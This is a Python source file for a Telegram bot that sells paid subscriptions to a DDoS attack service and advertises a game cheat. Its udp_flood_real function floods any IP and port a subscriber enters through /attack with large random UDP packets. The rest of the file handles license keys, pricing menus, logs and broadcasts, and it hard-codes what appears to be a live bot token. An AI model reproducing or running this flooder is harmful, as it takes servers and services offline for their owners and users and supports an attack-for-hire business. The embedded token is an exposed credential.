#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import time
import random
import string
import json
import threading
import socket
import sys
import re
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== BOT TOKEN ====================
BOT_TOKEN = '8424019822:AAEBYBEuVcWy7Djil2lT5Lin9FMowk6C6NE'
bot = telebot.TeleBot(BOT_TOKEN)
bot.remove_webhook()  # Conflict fix

# ==================== ADMIN IDs ====================
admin_id = ["7201893742"]
YOUR_USER_ID = "7201893742"

# ==================== FILES ====================
USER_FILE = "users.txt"
KEYS_FILE = "license_keys.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"
LOG_FILE = "log.txt"

# ==================== QR CODES ====================
QR_MAIN = "https://files.catbox.moe/8uxobs.jpg"
QR_ALTERNATIVE = "https://files.catbox.moe/p6teay.jpg"

# ==================== USER CONVERSATIONS ====================
user_conversations = {}

# ==================== FILE FUNCTIONS ====================

def load_keys():
    try:
        with open(KEYS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=4)

def load_subscriptions():
    try:
        with open(SUBSCRIPTIONS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_subscriptions(subs):
    with open(SUBSCRIPTIONS_FILE, "w") as f:
        json.dump(subs, f, indent=4)

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def has_active_subscription(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    if user_id_str in admin_id or user_id_str == YOUR_USER_ID:
        return True
    
    if user_id_str in subs:
        try:
            expiry_date = datetime.datetime.fromisoformat(subs[user_id_str])
            if expiry_date > datetime.datetime.now():
                return True
            else:
                del subs[user_id_str]
                save_subscriptions(subs)
        except:
            return False
    return False

def get_subscription_expiry(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    if user_id_str in admin_id or user_id_str == YOUR_USER_ID:
        return "Owner (Lifetime)"
    
    if user_id_str in subs:
        try:
            return datetime.datetime.fromisoformat(subs[user_id_str])
        except:
            return None
    return None

def add_subscription(user_id, days):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    current_expiry = get_subscription_expiry(user_id)
    if current_expiry and current_expiry != "Owner (Lifetime)" and current_expiry > datetime.datetime.now():
        new_expiry = current_expiry + datetime.timedelta(days=days)
    else:
        new_expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    
    subs[user_id_str] = new_expiry.isoformat()
    save_subscriptions(subs)
    return new_expiry

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()
bgmi_cooldown = {}
COOLDOWN_TIME = 300

def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time_duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time_duration:
        log_entry += f" | Time: {time_duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# ==================== REAL UDP FLOOD ATTACK ====================

def udp_flood_real(target_ip, target_port, duration):
    try:
        socks = []
        for _ in range(10):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        
        packet = random._urandom(65507)
        end_time = time.time() + duration
        count = 0
        
        while time.time() < end_time:
            for sock in socks:
                sock.sendto(packet, (target_ip, int(target_port)))
                count += 1
        
        for sock in socks:
            sock.close()
        return count
    except:
        return 0

# ==================== COMMAND HANDLERS ====================

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn_ddos = InlineKeyboardButton("DDOS ATTACK", callback_data="ddos_menu")
    btn_esp = InlineKeyboardButton("ESP AIMBOT", callback_data="esp_menu")
    btn_setup = InlineKeyboardButton("SETUP GUIDE", callback_data="setup_menu")
    markup.add(btn_ddos, btn_esp)
    markup.add(btn_setup)
    
    if has_active_subscription(user_id):
        expiry = get_subscription_expiry(user_id)
        if expiry and expiry != "Owner (Lifetime)":
            days_left = (expiry - datetime.datetime.now()).days
            status = f"Active ({days_left} din bache)"
        else:
            status = "Active"
    else:
        status = "No subscription"
    
    welcome_text = f"""HI - {user_name}

Bot by @M_JITENDRA

Status: {status}

Select Option:"""
    
    bot.reply_to(message, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if not has_active_subscription(user_id):
        bot.reply_to(message, "No subscription! Buy from @M_JITENDRA or use /redeem <key>")
        return
    
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 13.126.255.102 14001 60")
        return
    
    target = command[1]
    port = command[2]
    time_duration = int(command[3])
    
    if time_duration > 60:
        time_duration = 60
    
    log_command(user_id, target, port, time_duration)
    record_command_logs(user_id, '/attack', target, port, time_duration)
    
    bot.reply_to(message, f"ATTACK STARTED!\nTarget: {target}:{port}\nTime: {time_duration}s\n\nSending packets...")
    
    def run():
        total = udp_flood_real(target, port, time_duration)
        bot.reply_to(message, f"ATTACK COMPLETE!\nPackets Sent: {total:,}\nTarget: {target}:{port}\n\n@M_JITENDRA")
    
    threading.Thread(target=run, daemon=True).start()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "Usage: /redeem <key>")
        return
    
    key = command[1]
    keys = load_keys()
    
    if key in keys:
        key_data = keys.pop(key)
        days = key_data.get('days', 30)
        add_subscription(user_id, days)
        save_keys(keys)
        bot.reply_to(message, f"KEY REDEEMED! Access for {days} days added.\nUse /attack command now!")
    else:
        bot.reply_to(message, "INVALID KEY! Contact @M_JITENDRA")

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only owner can generate keys!")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /genkey <days>\nExample: /genkey 30")
        return
    
    days = int(command[1])
    key = generate_key()
    keys = load_keys()
    keys[key] = {"days": days, "created": str(datetime.datetime.now())}
    save_keys(keys)
    
    bot.reply_to(message, f"KEY GENERATED!\n\nKey: {key}\nDays: {days}\n\nSend to user: /redeem {key}")

@bot.message_handler(commands=['test'])
def test_command(message):
    bot.reply_to(message, "Bot is working! Owner: @M_JITENDRA")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """BOT COMMANDS

/start - Main menu
/attack <IP> <PORT> <TIME> - Start attack
/redeem <key> - Redeem license key
/genkey <days> - Generate key (admin)
/test - Test bot
/help - Show help

DDOS PRICES:
7 Days - Rs 160 | Month - Rs 199 | Season - Rs 250 | Permanent - Rs 299

ESP PRICES:
7 Days - Rs 199 | Month - Rs 250 | Season - Rs 350 (DDOS FREE)

Contact: @M_JITENDRA"""
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def rules_command(message):
    user_name = message.from_user.first_name
    response = f"""{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time
3. Join @M_JITENDRA
4. Follow rules to avoid ban"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def plan_command(message):
    user_name = message.from_user.first_name
    response = f"""{user_name}, DDOS Plans:

Vip Plan:
Attack Time: 300 seconds
After Attack Limit: 10 sec
Concurrents Attack: 5

Price:
3 day -> free
Week -> free
Month -> free"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admincmd_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    response = """Admin Commands:

/add <userId> <duration> - Add user
/remove <userid> - Remove user
/allusers - Show all users
/logs - View logs
/broadcast - Broadcast message
/clearlogs - Clear logs
/clearusers - Clear users
/genkey <days> - Generate key"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    try:
        with open(USER_FILE, "r") as f:
            users = f.read().splitlines()
            if users:
                response = "Authorized Users:\n"
                for uid in users:
                    try:
                        user_info = bot.get_chat(int(uid))
                        username = user_info.username
                        response += f"- @{username} (ID: {uid})\n"
                    except:
                        response += f"- User ID: {uid}\n"
            else:
                response = "No users found"
    except:
        response = "No users file found"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def logs_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    try:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    except:
        bot.reply_to(message, "No logs found!")

@bot.message_handler(commands=['clearlogs'])
def clearlogs_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    response = clear_logs()
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clearusers_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    try:
        open(USER_FILE, "w").close()
        bot.reply_to(message, "Users cleared successfully!")
    except:
        bot.reply_to(message, "Failed to clear users!")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    command = message.text.split(maxsplit=1)
    if len(command) != 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    
    msg = f"Broadcast from Owner:\n\n{command[1]}"
    
    try:
        with open(USER_FILE, "r") as f:
            users = f.read().splitlines()
            sent = 0
            for uid in users:
                try:
                    bot.send_message(uid, msg)
                    sent += 1
                    time.sleep(0.1)
                except:
                    pass
            bot.reply_to(message, f"Broadcast sent to {sent} users!")
    except:
        bot.reply_to(message, "No users found!")

# ==================== CALLBACK HANDLERS ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data == "ddos_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        btn_7 = InlineKeyboardButton("7 DAYS - Rs 160", callback_data="buy_ddos_7")
        btn_30 = InlineKeyboardButton("MONTH - Rs 199", callback_data="buy_ddos_30")
        btn_90 = InlineKeyboardButton("SEASON - Rs 250", callback_data="buy_ddos_90")
        btn_perm = InlineKeyboardButton("PERMANENT - Rs 299", callback_data="buy_ddos_perm")
        btn_back = InlineKeyboardButton("BACK", callback_data="main_menu")
        markup.add(btn_7, btn_30, btn_90, btn_perm, btn_back)
        
        bot.edit_message_text("DDOS ATTACK PRICES\n\n7 DAYS - Rs 160\nMONTH - Rs 199\nSEASON - Rs 250\nPERMANENT - Rs 299", 
                             call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "esp_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        btn_7 = InlineKeyboardButton("7 DAYS - Rs 199", callback_data="buy_esp_7")
        btn_30 = InlineKeyboardButton("MONTH - Rs 250", callback_data="buy_esp_30")
        btn_90 = InlineKeyboardButton("SEASON - Rs 350 (DDOS FREE)", callback_data="buy_esp_90")
        btn_back = InlineKeyboardButton("BACK", callback_data="main_menu")
        markup.add(btn_7, btn_30, btn_90, btn_back)
        
        bot.edit_message_text("ESP AIMBOT PRICES\n\n7 DAYS - Rs 199\nMONTH - Rs 250\nSEASON - Rs 350 (DDOS FREE)", 
                             call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "setup_menu":
        markup = InlineKeyboardMarkup()
        btn_back = InlineKeyboardButton("BACK", callback_data="main_menu")
        markup.add(btn_back)
        
        bot.edit_message_text("Setup Guide:\n\nContact @M_JITENDRA for setup help", 
                             call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith("buy_"):
        bot.answer_callback_query(call.id, "Contact @M_JITENDRA to purchase!")
        bot.send_message(call.message.chat.id, "To purchase, contact @M_JITENDRA directly!")
    
    elif call.data == "main_menu":
        user_name = call.from_user.first_name
        user_id = str(call.from_user.id)
        
        markup = InlineKeyboardMarkup(row_width=2)
        btn_ddos = InlineKeyboardButton("DDOS ATTACK", callback_data="ddos_menu")
        btn_esp = InlineKeyboardButton("ESP AIMBOT", callback_data="esp_menu")
        btn_setup = InlineKeyboardButton("SETUP GUIDE", callback_data="setup_menu")
        markup.add(btn_ddos, btn_esp)
        markup.add(btn_setup)
        
        if has_active_subscription(user_id):
            expiry = get_subscription_expiry(user_id)
            if expiry and expiry != "Owner (Lifetime)":
                days_left = (expiry - datetime.datetime.now()).days
                status = f"Active ({days_left} din bache)"
            else:
                status = "Active"
        else:
            status = "No subscription"
        
        welcome_text = f"HI - {user_name}\n\nBot by @M_JITENDRA\n\nStatus: {status}\n\nSelect Option:"
        
        bot.edit_message_text(welcome_text, call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    bot.answer_callback_query(call.id)

# ==================== UNKNOWN COMMAND ====================

@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    bot.reply_to(message, "Unknown command. Send /help for available commands.")

# ==================== MAIN ====================

print("""
========================================
         DDOS BOT - READY
         BY @M_JITENDRA
========================================

Bot is running!
Admin: 7201893742

Commands:
/start - Main menu
/attack <IP> <PORT> <TIME> - Attack
/redeem <key> - Redeem key
/genkey <days> - Generate key (admin)
/test - Test bot
/help - Help

Bot Ready!
""")

# Fix for conflict error
bot.remove_webhook()
time.sleep(1)
bot.infinity_polling(timeout=10, long_polling_timeout=5)
